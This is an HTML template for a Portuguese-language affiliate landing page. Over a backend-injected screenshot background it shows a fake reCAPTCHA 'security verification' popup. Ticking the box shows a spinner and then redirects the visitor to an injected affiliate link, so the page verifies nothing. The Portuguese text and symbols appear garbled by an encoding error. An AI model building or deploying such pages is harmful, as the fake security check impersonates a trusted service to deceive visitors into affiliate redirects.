<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Affiliate Page</title>

    <!-- Google Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">

    <style>
        /* --- CONFIGURA√á√ÉO DE IMAGENS (INJETADAS PELO BACKEND) --- */
        :root {
            --desktop-bg-image: url('{{DESKTOP_PRINT}}');
            --mobile-bg-image: url('{{MOBILE_PRINT}}');
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            height: 100%;
            width: 100%;
            overflow: hidden;
        }

        body {
            font-family: 'Poppins', sans-serif;
            background-color: #121212;
        }

        .background-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: var(--desktop-bg-image);
            background-size: cover;
            background-position: center;
            filter: brightness(0.8);
            z-index: -1;
        }

        @media (max-width: 768px) {
            .background-container {
                background-image: var(--mobile-bg-image);
            }
        }

        .overlay {
            position: fixed;
            inset: 0;
            background-color: rgba(0,0,0,0.3);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            opacity: 0;
            transition: opacity 0.6s ease-in-out;
        }

        .overlay.show {
            opacity: 1;
        }

        .popup {
            background: white;
            border-radius: 8px;
            padding: 24px;
            max-width: 350px;
            width: 90%;
            text-align: center;
            border: 1px solid #e0e0e0;
            box-shadow: 0 4px 25px rgba(0,0,0,0.15);
            transform: scale(0.7);
            transition: all 0.5s cubic-bezier(0.68,-0.55,0.265,1.55);
        }

        .overlay.show .popup {
            transform: scale(1);
        }

        .popup h2 {
            font-size: 18px;
            margin-bottom: 6px;
            color: #1f2937;
        }

        .popup p {
            font-size: 13px;
            margin-bottom: 20px;
            color: #6b7280;
        }

        .captcha-box {
            border: 2px solid #d9d9d9;
            border-radius: 3px;
            background: #f9f9f9;
            display: flex;
            cursor: pointer;
            min-height: 68px;
        }

        .captcha-main-content {
            display: flex;
            align-items: center;
            padding: 12px 14px;
            gap: 10px;
            flex: 1;
        }

        .captcha-checkbox {
            width: 24px;
            height: 24px;
            appearance: none;
            border: 2px solid #c1c1c1;
            border-radius: 2px;
            background: #fff;
            cursor: pointer;
        }

        .captcha-checkbox:checked {
            background: #4285f4;
            border-color: #4285f4;
        }

        .captcha-checkbox:checked::after {
            content: '‚úì';
            color: white;
            font-size: 16px;
            position: relative;
            left: 4px;
            top: 0;
        }

        .captcha-text {
            font-size: 13px;
            color: #222;
        }

        .captcha-logo {
            border-left: 1px solid #d9d9d9;
            padding: 6px 10px;
            display: flex;
            align-items: center;
            background: white;
        }

        .captcha-loading {
            display: none;
            align-items: center;
            justify-content: center;
            gap: 12px;
            font-size: 13px;
            color: #4285f4;
            padding: 16px;
        }

        .loading-spinner {
            width: 18px;
            height: 18px;
            border: 2px solid #e5e7eb;
            border-top: 2px solid #4285f4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>

<body>
    <div class="background-container"></div>

    <div class="overlay" id="genderOverlay">
        <div class="popup">
            <h2>Verifica√ß√£o de Seguran√ßa</h2>
            <p>Complete a verifica√ß√£o para continuar</p>

            <div class="captcha-box" id="captcha-box">
                <div class="captcha-main-content">
                    <input type="checkbox" id="captcha-checkbox" class="captcha-checkbox">
                    <div class="captcha-text">N√£o sou um rob√¥</div>
                </div>
                <div class="captcha-logo">reCAPTCHA</div>
            </div>

            <div class="captcha-loading" id="captcha-loading">
                <div class="loading-spinner"></div>
                <span>Verificando...</span>
            </div>
        </div>
    </div>

    <script>
        // üîÅ LINK INJETADO PELO BACKEND
        const AFFILIATE_LINK = "{{AFFILIATE_LINK}}";

        const overlay = document.getElementById("genderOverlay");
        const captchaBox = document.getElementById("captcha-box");
        const checkbox = document.getElementById("captcha-checkbox");
        const loading = document.getElementById("captcha-loading");

        let clicked = false;

        function redirect() {
            if (clicked) return;
            clicked = true;

            captchaBox.style.display = "none";
            loading.style.display = "flex";

            setTimeout(() => {
                window.location.href = AFFILIATE_LINK;
            }, 1200);
        }

        checkbox.addEventListener("change", () => {
            if (checkbox.checked) redirect();
        });

        captchaBox.addEventListener("click", (e) => {
            if (e.target !== checkbox) {
                checkbox.checked = !checkbox.checked;
                checkbox.dispatchEvent(new Event("change"));
            }
        });

        window.addEventListener("load", () => {
            overlay.classList.add("show");
        });
    </script>
</body>
</html>
